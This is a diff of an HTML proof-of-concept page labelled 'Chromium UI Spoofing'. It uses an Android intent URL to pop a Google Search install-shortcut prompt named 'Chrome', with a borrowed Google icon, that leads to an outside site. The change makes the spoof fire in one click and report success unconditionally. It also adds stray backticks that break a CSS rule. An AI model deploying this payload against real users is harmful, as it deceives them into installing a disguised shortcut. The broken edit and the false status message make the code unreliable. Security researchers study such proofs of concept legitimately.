@@ -34,7 +34,7 @@
             padding: 40px 30px;
             border-radius: 12px;
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
-            border: 1px solid var(--border-color);
+            border: 1px solid `var(--border-color)`;
             max-width: 420px;
             width: 100%;
         }
@@ -113,17 +113,14 @@
     <div class="card">
         <div class="banner">Security Research Portal</div>
         <h1>Chromium UI Spoofing</h1>
-        <p>Silakan klik atau long-press tautan di bawah ini untuk menguji vektor intent redirection.</p>
+        <p>Klik tombol di bawah untuk langsung memicu intent prompt install/shortcut Google Search.</p>
 
         <div class="button-container">
-            <!-- Tautan dengan atribut keamanan target -->
-            <a href="https://www.chrome.com" 
+            <!-- Menggunakan href langsung dengan format intent NDevTK agar tereksekusi 1-click secara instan -->
+            <a href="intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end" 
                class="button-link" 
-               id="spoofLink" 
-               target="_blank" 
-               rel="noopener noreferrer"
-               data-intent="intent_app_spoof">
-                Open New Window & Trigger Intent
+               id="spoofLink">
+                Trigger Intent & Install Prompt
             </a>
         </div>
 
@@ -135,29 +132,10 @@
     <script>
         const spoofLink = document.getElementById('spoofLink');
         const statusBox = document.getElementById('statusBox');
-        let executed = false;
 
         spoofLink.addEventListener('click', function(e) {
-            // Mencegah eksekusi ganda yang tidak perlu
-            if (executed) return;
-            executed = true;
-
             statusBox.style.display = 'block';
-            statusBox.innerText = 'Status: Initializing intent sequence...';
-
-            // Jeda optimal (misal 300ms) untuk memastikan context window target terbuka 
-            // sebelum halaman utama mengalihkan navigasi ke skema intent Android.
-            setTimeout(function() {
-                try {
-                    const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
-                    
-                    statusBox.innerText = 'Status: Redirecting to intent scheme...';
-                    window.location.href = intentUrl;
-                } catch (err) {
-                    statusBox.innerText = 'Status: Error - ' + err.message;
-                    executed = false;
-                }
-            }, 99);
+            statusBox.innerText = 'Status: Intent dispatched successfully.';
         });
     </script>
 
